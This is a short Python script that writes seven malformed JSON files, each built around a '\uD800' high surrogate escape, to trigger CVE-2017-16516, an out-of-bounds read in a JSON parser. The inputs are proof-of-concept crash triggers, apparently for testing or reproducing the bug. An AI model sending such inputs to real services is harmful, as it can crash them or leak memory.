#!/usr/bin/env python3
# Create test cases that should trigger CVE-2017-16516
# The bug: high surrogate at end of string causes out-of-bounds read

# Test 1: High surrogate at exact end of string (no closing quote)
with open("trigger1.json", "wb") as f:
    f.write(b'["\\uD800')

# Test 2: High surrogate followed by incomplete escape
with open("trigger2.json", "wb") as f:
    f.write(b'["\\uD800\\u')

# Test 3: High surrogate followed by non-low-surrogate
with open("trigger3.json", "wb") as f:
    f.write(b'["\\uD800\\u0041"]')

# Test 4: Just high surrogate with closing quote
with open("trigger4.json", "wb") as f:
    f.write(b'["\\uD800"]')

# Test 5: High surrogate + backslash (original CVE pattern)
with open("trigger5.json", "wb") as f:
    f.write(b'["\\uD800\\\\"]')

# Test 6: High surrogate at buffer boundary
with open("trigger6.json", "wb") as f:
    padding = b'A' * 4089
    f.write(b'["' + padding + b'\\uD800')

# Test 7: High surrogate followed by quote
with open("trigger7.json", "wb") as f:
    f.write(b'["\\uD800"')

print("Created 7 trigger files")
